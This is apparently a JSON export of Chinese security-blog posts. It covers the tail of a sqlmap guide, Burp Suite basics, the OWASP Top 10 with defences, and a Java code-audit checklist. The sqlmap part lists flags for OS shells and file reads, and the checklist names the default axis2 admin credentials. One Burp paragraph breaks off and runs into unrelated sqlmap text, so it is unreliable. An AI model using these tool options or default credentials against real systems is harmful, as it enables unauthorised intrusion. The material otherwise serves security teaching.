“ex_password,ex_username 如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数 据的，可以使用-v参数。 共有七个等级，默认为1： 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。 如果你想看到sqlmap发送的测试payload最好的等级就是3 sqlmap常用命令-u 指定url（需带get） -m 从文件读取 -r 从request文件测试 -l 从burp的log –data 有时无法识别时 用-r –file-read –file-write –os-cmd/–os-shell –flush-session ➢api 自动化、分布式 sqlmapapi.py -s H 127.0.0.1 -p 6666","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"工具使用，slqmap","slug":"工具使用，slqmap","permalink":"http://yoursite.com/tags/工具使用，slqmap/"}]},{"title":"Burp Suite基本认识","slug":"Burp-Suite基本认识","date":"2018-08-15T02:23:24.000Z","updated":"2018-08-15T02:38:49.226Z","comments":true,"path":"2018/08/15/Burp-Suite基本认识/","link":"","permalink":"http://yoursite.com/2018/08/15/Burp-Suite基本认识/","excerpt":"Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。它主要用来做安全性渗透测试,代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动。","text":"Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。它主要用来做安全性渗透测试,代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动。 Target功能目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以 让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏 洞的过程。 site map——add to scope——点击Filter勾选Show only inscope item proxy（抓包）当我们设置好代理后，浏览器和服务器之间的数据包会被burp拦截，我们可以修改浏览器限制数据，修改完成直接forward就可以。 spider（爬虫）可以利用爬虫从页面源代码中提取子域名，以 burp 的爬虫为例： scanner（扫描）Burp Scanner的功能主要是用来自动检测web系统的各种漏洞，我们可以使用Burp Scanner代替我们手工去对系统进行普通漏洞类型的渗透测试，从而能使得我们把更多的精力放在那些必须要人工去验证的漏洞上。 Intruder（爆破）Burp intruder是一个强大的工具，用于自动对Web应用程序自定 义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可 能出现的u支持自动识别密码哈希格式并通过字典破解密码哈希。 支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。 支持在数据库管理系统中搜索指定的数据库名、表名或列名 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。 ​ 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出 第一种： Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种： Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种： Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种： Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 Repeater功能Burp Repeater(中继器)是用于手动操作和补发个别HTTP请求，并 分析应用程序的响应一个简单的工具。您可以发送一个内部请求从 Burp任何地方到Repeater(中继器)，修改请求并且发送它。 ➢您可以使用中继器用于各种目的，如改变参数值来测试输入为基础 的漏洞，发出以特定的顺序要求，以测试逻辑缺陷，并可以多次重 发从Burp Scanning results(扫描结果)的要求手动验证报告的问题。","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"http://yoursite.com/tags/工具使用/"}]},{"title":"OWASP TOP 10","slug":"OWASP-TOP-10","date":"2018-08-14T07:53:10.000Z","updated":"2018-08-14T07:59:44.496Z","comments":true,"path":"2018/08/14/OWASP-TOP-10/","link":"","permalink":"http://yoursite.com/2018/08/14/OWASP-TOP-10/","excerpt":"开源Web应用安全项目（OWASP ）是一个开放的社区，致力于帮助各企业组织开发、购买和维护可信任的应用程序。","text":"开源Web应用安全项目（OWASP ）是一个开放的社区，致力于帮助各企业组织开发、购买和维护可信任的应用程序。 A1:注入将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。 影响： 注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机完全接管。 应用程序脆弱： 用户提供的数据没有经过应用程序的验证、过滤或净化 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。 在ORM搜索参数中使用了恶意数据，这样搜索就得包含敏感或未授权的数据。 恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语句、命令或存储过程中包含结构和恶意数据。 如何防止： 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。 使用正确的或“白名单”的具有恰当规范化的验证方法同样会有助于防止注入攻击，但这个不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符，OWASP的Java Encoder和雷士的库提供了这样的转义例程。 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。 A2：失效的身份认证通常。通过错误使用程序的身份认证和会话管理功能，红记者能后破译密码，密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久冒充其他用户的身份。 影响： 攻击者只需要访问几个账户，或者只需要一个管理员账户就可以破坏我们的系统，根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。 脆弱性： 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。 允许暴力破解或其他自动攻击。 允许默认的、弱的或众所周知的密码，例如“Password1”或 “admin/admin”。 使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的 答案”，这是不安全的。 使用明文、加密或弱散列密。 缺少或失效的多因素身份验证。 暴露URL中的会话ID（例如URL重写）。 在成功登录后不会更新会话ID。 不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证 令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。 防范： 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、 暴力破解和被盗凭据再利用攻击。 不要使用发送或部署默认的凭证，特别是管理员用户。 执行弱密码检查，例如测试新或变更的密码。 将密码长度、复杂性和循环策略，或其他现代的基于证据的密码策略相一致。 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同 的消息，用以抵御账户枚举攻击。 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填 充、暴力破解或其他攻击被检测时提醒管理员。 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的 新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、 闲置、绝对超时后使其失效 A3:敏感数据泄露许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可 以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。 脆弱性： 在数据传输过程中是否使用明文传输？这和传输协议相关，如： HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通 信，如：负载平衡器、Web服务器或后端系统之间的通信。 当数据被长期存储时，无论存储在哪里，它们是否都被加密，包 含备份数据？ 无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加 密算法？ 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者 缺少恰当的密钥管理或密钥回转？ 是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和 传输协议是否被加密？ 用户代理（如：应用程序、邮件客户端）是否未验证服务器端证 书的有效性 防范： 对系统处理、存储或传输的数据分类，并根据分类进行访问控制。 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保 护敏感数据。 对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过 PCI DSS标记或拦截。未存储的数据不能被窃取。 确保存储的所有敏感数据被加密。 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 确保传输过程中的数据被加密，如：使用TLS。确保数据加密被 强制执行，如：使用HTTP严格安全传输协议（HSTS ）。 禁止缓存对包含敏感数据的响应。 确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、 bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受 范围。 单独验证每个安全配置项的有效性。 A4：XML外部实体（XXE）许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃 取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻 击。 如果攻击者可以上传XML文档或者在 XML文档中添加恶意内容，通过易受 攻击的代码、依赖项或集成，他们就 能够攻击含有缺陷的XML处理器。 影响： XXE缺陷可用于提取数据、执行远程 服务器请求、扫描内部系统、执行拒 绝服务攻击和其他攻击。 业务影响取决于所有受影响的应用程 序和数据保护需求。 脆弱性： 您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件， 并提交给XML处理器解析。 在应用程序或基于Web服务的SOAP中，所有XML处理器都启用 了文档类型定（DTDs）。因为禁用DTD进程的确切机制因处 理器而不同，更多资料请参考：《OWASP Cheat Sheet ‘XXE Prevention‘ 》。 如果为了实现安全性或单点登录（SSO），您的应用程序使用 SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。 如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传 递到SOAP框架，那么它可能受到XXE攻击。 存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括： Billion Laughs 攻击。 防范： 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进 行序列化。 及时修复或更新应用程序或底层操作系统使用的所有XML处理器 和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高 版本。 参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》，在应用程序 的所有XML解析器中禁用XML外部实体和DTD进程。 在服务器端实施积极的（“白名单”）输入验证、过滤和清理， 以防止在XML文档、标题或节点中出现恶意数据。 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证 方法来验证上传的XML文件。 尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的 最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。 A5:失效的访问控制未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数 据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。 影响： 攻击者可以冒充用户、管 理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。 业务影响取决于应用程序和数据的保护需求。 脆弱性： 通过修改 URL、内部应用程序状态或 HTML页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。 允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。 特权提升。在不登录的情况下假扮用户，或以用户身份登录时充 当管理员。 元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权 限的cookie 或隐藏字段。 CORS配置错误允许未授权的API访问。 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看 到的页面、或作为标准用户访问具有相关权限的页面、或API没 有对POST、PUT和DELETE强制执行访问控制。 防范： 除公有资源外，默认情况下拒绝访问。 使用一次性的访问控制机制，并在整个应用程序中不断重用它们， 包括最小化CORS使用。 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、 读取、更新或删除的任何记录。 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域 模型强制执行。 禁用 Web服务器目录列表，并确保文件元数据（如：git）不存 在于 Web的根目录中。 记录失败的访问控制，并在适当时向管理员告警（如：重复故 障）。 对API和控制器的访问进行速率限制，以最大限度地降低自动化 攻击工具的危害。 当用户注销后，服务器上的JWT令牌应失效。 A6：安全配置错误安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云 存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所 有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。 通常，攻击者能够通过未修复的漏洞、 访问默认账户、不再使用的页面、未 受保护的文件和目录等来取得对系统 的未授权的访问或了解。 影响： 这些漏洞使攻击者能经常访问一些未 授权的系统数据或功能。有时，这些 漏洞导致系统的完全攻破。 业务影响取决于您的应用程序和数据 的保护需求 脆弱性： 应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的 权限配置错误。 应用程序启用或安装了不必要的功能（例如：不必要的端口、服 务、网页、帐户或权限）。 默认帐户的密码仍然可用且没有更改。 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。 对于更新的系统，禁用或不安全地配置最新的安全功能。 应用程序服务器、应用程序框架（如：Struts、Spring、 ASP.NET）、库文件、数据库等没有进行安全配置。 服务器不发送安全标头或指令，或者未对服务器进行安全配置。 您的应用软件已过期或易受攻击 防范： 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。 开发、质量保证和生产环境都应该进行相同配置，并且，在每个 环境中使用不同的密码。这个过程应该是自动化的，以尽量减少 安装一个新安全环境的耗费 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档 和示例。移除或不安装不适用的功能和框架。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并 将其作为更新管理过程的一部分。在检查过程中，应特别注意云存储权限（如： S3桶权限）。 一个能在组件和用户间提供有效的分离和安全性的分段应用程 序架构，包括：分段、容器化和云安全组。 • 向客户端发送安全指令，如：安全标头。 在所有环境中能够进行正确安全配置和设置的自动化过程。 A7：跨站脚本（XSS）当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或 JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器 中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。 影响： XSS对于反射和DOM的影响是中 等的，而对于存储的XSS，XSS的 影响更为严重，譬如在受攻击者的 浏览器上执行远程代码，例如：窃 取凭证和会话或传递恶意软件等 脆弱性： 存在三种XSS类型，通常针对用户的浏览器： 反射式XSS：应用程序或API包括未经验证和未经转义的用户输入， 作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者 的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指 向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站， 广告或类似内容。 存储式XSS：你的应用或者API将未净化的用户输入存储下来了， 并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一 般被认为是高危或严重的风险。 基于DOM的XSS：会动态的将攻击者可控的内容加入页面的 JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的 来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript API。 典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、 对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其 他用户侧的攻击。 防范： 使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0 或 React JS。了解每个框架的XSS保护的局限性，并适当地处 理未覆盖的用例。 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML 输出的上下文（包括：主体、属性、JavaScript、CSS或URL） 对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据 转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》 。 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》 描述的类似上下文敏感的转义技术应用于浏览器API。 使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果 不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径 遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有 效的。 A8:不安全的反序列化不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以 利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。 对反序列化的利用是有点困难的。因 为在不更改或调整底层可被利用代码 的情况下，现成的反序列化漏洞很难 被使用 影响： 反序列化缺陷的影响不能被低估。它 们可能导致远程代码执行攻击，这是 可能发生的最严重的攻击之一。业务影响取决于应用程序和数据的保 护需求。 脆弱性： 这可能导致两种主要类型的攻击： 如果应用中存在可以在反序列化过程中或者之后被改变行为的类， 则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我 们将其称为对象和数据结构攻击。 典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有 的数据结构，但内容发生了变化。 在应用程序中，序列化可能被用于: 远程和进程间通信（RPC / IPC） 连线协议、Web服务、消息代理 缓存/持久性 数据库、缓存服务器、文件系统 HTTP cookie、HTML表单参数、API身份验证令牌 防范： 执行完整性检查，如：任何序列化对象的数字签名，以防止恶 意对象创建或数据篡改。 在创建对象之前强制执行严格的类型约束，因为代码通常被期 望成一组可定义的类。绕过这种技术的方法已经被证明，所以 完全依赖于它是不可取的。 如果可能，隔离运行那些在低特权环境中反序列化的代码。 记录反序列化的例外情况和失败信息，如：传入的类型不是预 期的类型，或者反序列处理引发的例外情况。 限制或监视来自于容器或服务器传入和传出的反序列化网络连 接。 监控反序列化，当用户持续进行反序列化时，对用户进行警告。 A9：使用含有已知漏洞的组件组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏 洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组 件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。 影响： 虽然对于一些已知的漏洞其影响很小， 但目前很多严重的安全事件都是利用 组件中的已知漏洞。根据你所要保护 的资产，此类风险等级可能会很高。 脆弱性： 如果你不知道所有使用的组件版本信息（包括：服务端和客户 端）。这包括了直接使用的组件或其依赖的组件。 如果软件易受攻击，不再支持或者过时。这包括：OS、Web服 务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、 API和所有的组件、运行环境和库。 如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。 如果你不基于风险并及时修复或升级底层平台、框架和依赖库。 很可能发生这种情况：根据变更控制，每月或每季度进行升级， 这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼 容性测试。 如果你没有对组件进行安全配置 防范： 移除不使用的依赖、不需要的功能、组件、文件和文档。 利用如 versions、DependencyCheck 、retire.js等工具来持续的 记录客户端和服务器端以及它们的依赖库的版本信息。持续监控 如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软 件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警 告邮件。 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡 改或加入恶意漏洞的风险 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打 补丁，可以考虑部署虚拟补丁来监控、检测或保护。 每个组织都应该制定相应的计划，对整个软件生命周期进行监控、 评审、升级或更改配置。 A10:不足的日志记录和监控不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持 续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超 过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。 脆弱性： 下列情况会导致不足的日志记录、检测、监控和响应： 未记录可审计性事件，如：登录、登录失败和高额交易。 告警和错误事件未能产生或产生不足的和不清晰的日志信息。 没有利用应用系统和API的日志信息来监控可疑活动。 日志信息仅在本地存储。 没有定义合理的告警阈值和制定响应处理流程。 渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触 发告警 对于实时或准实时的攻击，应用程序无法检测、处理和告警 防范： 根据应用程序存储或处理的数据的风险： 确保所有登录、访问控制失败、输入验证失败能够被记录到日 志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐 户，并为后期取证预留足够时间。 确保日志以一种能被集中日志管理解决方案使用的形式生成 确保高额交易有完整性控制的审计信息，以防止篡改或删除， 例如审计信息保存在只能进行记录增加的数据库表中。 建立有效的监控和告警机制，使可疑活动在可接受的时间内被 发现和应对。 建立或采取一个应急响应机制和恢复计划，例如：NIST 80061 rev 2或更新版本。 参考文献：http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf https://blog.csdn.net/SKI_12/article/details/69952026?locationNum=13&amp;fps=1","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/categories/漏洞分析/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://yoursite.com/tags/漏洞/"}]},{"title":"Java代码审计（整理）","slug":"Java代码审计（整理）","date":"2018-08-13T15:02:00.000Z","updated":"2018-08-13T15:15:56.563Z","comments":true,"path":"2018/08/13/Java代码审计（整理）/","link":"","permalink":"http://yoursite.com/2018/08/13/Java代码审计（整理）/","excerpt":"0x01 测试工具1.1 反编译java类如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译","text":"0x01 测试工具1.1 反编译java类如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译 选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码 1.2 Eclipse环境审计 使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。 0x02 认证管理2.1 图形验证码 用户登录过程是否有图形验证码保护，防止自动化程序猜测密码 验证码复杂度是否符合要求（干扰、变形） 验证码在使用过一次后是否会自动刷新 验证码明文是否会被传送给客户端（页面或Cookie） 验证码是否在被保护的操作进行前来验证（无验证或无效验证） 2.2 认证实现 用户认证过程中，用户名和密码合法性的检查方式是否符合要求 较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文 是否具备用户注销功能 用户注销时是否清理了当前用户会话 是否会将密码作为重定向的一部分进行传送 在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。 认证过程中对于用户名错误和密码错误提示是否相同 统一用户名和密码错误提示，可以降低账号、密码被猜解的风险 检查用户认证页面是否对认证失败的次数进行了限制 0x03 授权管理3.1 授权实现 应用的用户是否具有角色的区分 明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权 应用是否具备统一的（或独立）的权限控制模块 大部分的大型应用都会采用统一的权限控制模块 应用的权限控制模块是否存在漏洞 页面/功能是否使用了权限控制（模块） 识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。 页面的权限控制是否正确 部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源 3.2 授权管理 高权限用户分析 分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等 默认用户分析 分析系统是否存在默认用户、密码，密码复杂度等。 0x04 输入/输出验证4.1 SQL注入防护 是否存在全局过滤器 过滤器配置、过滤函数等 过滤器是否可以过滤所有查询请求 请求是否都按要求经过过滤器处理 过滤器的过滤是否符合要求 初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充 是否使用了预查询机制 预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。 是否存在SQL语句拼接 某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。 4.2 跨站攻击防护 是否存在全局XSS过滤器(论坛的过滤库) 过滤器的过滤是否符合要求 是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*） 某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。 输出的时候是否进行编码（HTML、JS） 4.3 CSRF攻击防护 Web表单是否使用了Token（或验证码） Web表单提交（成功或不成功）后token（或验证码）是否重置 检查Token的生成算法是否安全 可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。 检查服务器获取Web表单参数值的方式 如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。 4.4 文件上传防护 是否限制了上传文件的扩展名 以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名 是否对上传文件进行了重命名操作 重命名操作是否安全，防止重命名过程中产生二次风险 是否对上传文件的存放位置禁止了脚本执行 4.5 文件下载防护 是否存在客户端指定文件名的下载功能 直接指定文件名的下载是否允许客户端指定路径 对于不同用户的文件在下载时是否进行了权限控制 文件下载功能中是否对用户的权限进行了检查。 4.6 重定向与转发保护 是否具有客户端控制的重定向或转发 是否定义了重定向的信任域名或主机列表 是否对客户端的重定向或转发请求进行检查 0x05 会话管理5.1 Session管理 session信息是否放在url里面 通过应用服务器的配置检查 执行业务功能时，是否检查了当前用户session身份 从代码部分、从配置部分检查，需要根据应用实际使用的验证方式 成功登陆之后是否会更新SessionID 认证成功后是否强制刷新用户使用的SessionID session是否有超时注销功能 检查Session的超时时间设置是否符合要求，默认是20~30分钟 5.2 Cookie管理 是否会在Cookie中存储明文或简单编码/加密过的密码 是否会在Cookie中存储应用的特权标识 是否设置了Cookie的有效域和有效路径 是否设置了合适的Cookie有效时间 如果生存时间在20~30分钟左右，使用Session方式会更加安全 0x06 密码管理6.1 加密安全 密码是否以不可逆的哈希形态存储 是否使用不带salt的哈希算法来加密密码 加密哈希算法中的salt是否硬编码在代码中 6.2 密码安全 认证过程中传输的密码是否进行了加密处理 可以采用哈希算法或者RSA等加密算法将密码加密后传递，或者是使用SSL来做传输层加密。 修改密码功能是否进行了旧密码的验证或者是安全问题的确认 找回密码功能是否借用第三方途径 第三方途径主要有电子邮件、手机短信等。这些途径应该是找回密码前预留的。 找回密码功能是否采用验证码确认并重设机制 部分应用的找回密码功能是直接将原密码发送到密码保护邮箱，这种方式存在一定的安全风险。 检查密码设置页面是否对密码复杂度进行检查 至少包含数字和字母，长度最少6位，避免用户输入弱口令 0x08 调试&amp;接口7.1 异常处理 是否捕获了应用出现的错误并阻止其输出给客户端 详细的错误输出可能会导致SQL查询泄露、程序源代码泄露、物理路径泄露等。 异常处理是否能够全面覆盖所有异常行为 异常处理是否会导致程序流程异常，引发安全问题 备注：某些异常可能是致命的，但是如果程序捕获了异常，可能会导致程序绕过一些重要的步骤而直接执行后续的操作。 7.2 数据接口 接口服务是否存在安全漏洞 接口服务后台登录是否存在弱密码 例如：axis2，http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\\axis2\\WEB-INF\\conf\\axis2.xml里配置 接口服务是否有默认的测试页面 例如：axis2，http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径 接口服务应用是否包含身份认证，认证的帐号、密码（或密钥）的存储安全 例如：使用WSS4J对SOAP报文体进行身份认证 接口服务应用传输是否加密 例如：使用WSS4J对SOAP报文体进行加密 接口服务应用异常处理 例如：Webservice应用对特殊字符的处理，是否会在报错信息中泄露数据，参考http://www.soapui.org/About-SoapUI/features.html#security-testing 7.3 硬编码 代码中是否存在内置的敏感信息 如：调试帐号、外部接口帐号/密码、数据加/解密密钥等 0x08 日志审计8.1 日志记录 应用是否会将用户密码记入日志 日志记录的内容是否合理，避免日志文件增长过快，造成磁盘空间不足 0x09 运行环境9.1 应用配置 是否删除了不必要的网页、帐号及权限 页面包括应用服务器的默认页面、管理后台、测试页面、备份文件等；帐号指Web应用服务器的运行帐户 目录浏览是否被禁用 Web容器默认帐户的密码是否更改或禁用 不能删除的管理后台是否启用了密码保护 正式发布的应用是否包含开发调试文件、代码 如SVN版本信息文件、调试工具/页面、功能模块中的调试接口等 重要的配置信息是否进行了加密 如数据库连接配置、其它接口连接配置等 9.2 自定义错误 是否自定义了403、404、500错误页面 错误页面是否会输出详细错误信息 9.3 日志管理 服务器是否开启了用户访问日志的记录 记录的日志是否满足问题回溯的要求 是否记录了客户端地址、请求的方法、请求的URL、提交的参数（GET、POST、COOKIE参数）、请求的状态等 0x10 第三方组件分析应用使用的框架及引用的第三方组件，分析其是否存在各种已知漏洞，且当前环境漏洞是否可以重现 10.1 框架 Struts/Struts 2 Turbine Spring MVC Hibernate iBatis DotNetNuke 10.2 编辑器 CKEditor/FCKEditor eWebeditor NicEdit Free Rich Text Editor 10.3 上传组件 SmartUpload 0x11 安全功能对于比较重要的业务系统，例如：支付系统，可以参考以下条目，进行检测 